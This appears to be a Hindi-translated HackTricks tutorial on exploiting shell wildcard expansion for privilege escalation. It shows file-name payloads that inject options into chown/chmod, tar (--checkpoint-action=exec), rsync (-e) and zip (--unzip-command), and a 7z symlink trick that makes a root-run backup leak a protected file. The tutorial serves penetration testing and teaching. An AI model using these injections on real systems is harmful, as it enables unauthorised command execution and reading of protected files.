<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित करना चाहते हैं**? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>


## chown, chmod

आप **बाकी फ़ाइलों के लिए किस फ़ाइल मालिक और अनुमतियाँ कॉपी करना चाहते हैं** इसे दर्शा सकते हैं
```bash
touch "--reference=/my/own/path/filename"
```
आप इसे [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) का उपयोग करके शोषण कर सकते हैं _(संयुक्त हमला)_\
__[https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) में अधिक जानकारी__

## टार

**अनियमित आदेशों को निष्पादित करें:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
आप इसे [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) का उपयोग करके शोषण कर सकते हैं _(tar हमला)_\
__[https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) में अधिक जानकारी दी गई हैं।

## Rsync

**विचित्र आदेशों को निष्पादित करें:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
आप इसे [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) का उपयोग करके शोषण कर सकते हैं _(_rsync _attack)_\
__अधिक जानकारी के लिए [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) पर जाएं

## 7z

**7z** में `--` के पहले `*` का उपयोग करते हुए (ध्यान दें कि `--` का अर्थ है कि आगामी इनपुट को पैरामीटर के रूप में नहीं लिया जा सकता है, इसलिए इस मामले में केवल फ़ाइल पथ होते हैं) आप एक अनियमित त्रुटि को पढ़ने के लिए उत्पन्न कर सकते हैं, इसलिए यदि रूट द्वारा निम्नलिखित प्रकार का एक कमांड निष्पादित किया जा रहा है:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
और आप इस फ़ोल्डर में फ़ाइलें बना सकते हैं जहां यह निष्पादित किया जा रहा है, आप `@root.txt` नामक फ़ाइल और `root.txt` नामक फ़ाइल बना सकते हैं, जो आपको पढ़ना चाहते हैं वह फ़ाइल के लिए एक **symlink** होगी:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
तब, जब **7z** को चलाया जाएगा, तो यह `root.txt` को एक फ़ाइल के रूप में देखेगा जिसमें यह सूची होगी कि वह कौन सी फ़ाइलें संपीड़ित करनी चाहिए (यही बात `@root.txt` की मौजूदगी दर्शाती है) और जब 7z `root.txt` को पढ़ेगा तो यह `/file/you/want/to/read` को पढ़ेगा और **क्योंकि इस फ़ाइल की सामग्री फ़ाइलों की एक सूची नहीं है, इसलिए यह त्रुटि दिखाएगा** और सामग्री दिखाएगा।

_अधिक जानकारी HackTheBox के CTF बॉक्स के Write-ups में।_

## Zip

**क्रमिक आदेश द्वारा आपातकालीन कमांडों को चलाएं:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
__


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>
